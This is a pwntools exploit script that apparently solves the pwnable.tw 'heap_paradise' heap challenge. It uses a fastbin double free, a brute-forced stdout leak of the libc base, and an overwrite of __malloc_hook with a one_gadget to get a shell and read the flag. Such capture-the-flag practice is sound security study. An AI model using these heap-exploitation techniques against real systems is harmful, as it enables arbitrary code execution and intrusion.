from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')


def malloc(size, data):
	p.recvuntil('Choice:')
	p.sendline('1')
	p.recvuntil('Size :')
	p.sendline(str(size))
	p.recvuntil('Data :')
	p.send(data)

def free(idx):
	p.recvuntil('Choice:')
	p.sendline('2')
	p.recvuntil('Index :')
	p.sendline(str(idx))

while(1):
	debug = 0
	if debug == 1:
		p = process('./heap_paradise')
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		gadget = 0xf02a4
	else:
		p = remote('chall.pwnable.tw', 10308)
		libc = ELF('./libc_64.so.6')
		gadget = 0xef6c4
	
	malloc(0x68, p64(0) * 3 + p64(0x71))#0
	malloc(0x68, p64(0) * 8 + p64(0) + p64(0x21))#1
	
	free(0)
	free(1)
	free(0)
	
	malloc(0x68, '\x20')#2 0
	malloc(0x68, '\x00')#3 1
	malloc(0x68, '\x00')#4 2 0
	malloc(0x68, '\x00')#5
	
	free(2)
	malloc(0x68, p64(0) * 3 + p64(0xa1))#6
	
	free(5)
	free(0)
	free(1)
	
	malloc(0x78, p64(0) * 8 + p64(0) + p64(0x71) + "\xa0")#7
	free(7)
	try:
		print('-------------------\ntrying\n----------------')
		malloc(0x68, p64(0) * 4 + p64(0) + p64(0x71) + p64(libc.symbols['_IO_2_1_stdout_'] - 0x43)[:2])#8
		malloc(0x68, "\x00")#9
		malloc(0x68, '\x00' * 3 + p64(0) * 6 + p64(0xfbad2087 + 0x1800) + p64(0) * 3 + "\x80")# 10
	except:
		p.close()
		continue
	else:
		break

#gdb.attach(p, 'b malloc\nb free')

libc_base = u64(p.recvline()[8: 14].ljust(8, '\x00')) - libc.symbols['_IO_2_1_stdin_']
log.success('libc_base:' + hex(libc_base))

malloc_addr = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + gadget


free(0)
free(1)
free(0)

malloc(0x68, p64(malloc_addr-0x23))#11
malloc(0x68, "\x00")#12
malloc(0x68, "\x00")#13
malloc(0x68, '\x00' * 0x13 + p64(one_gadget))#14
p.recvuntil('Choice:')
p.sendline('1')
p.recvuntil('Size :')
p.sendline('48')
p.sendline('cat /home/heap_paradise/flag')

p.interactive()
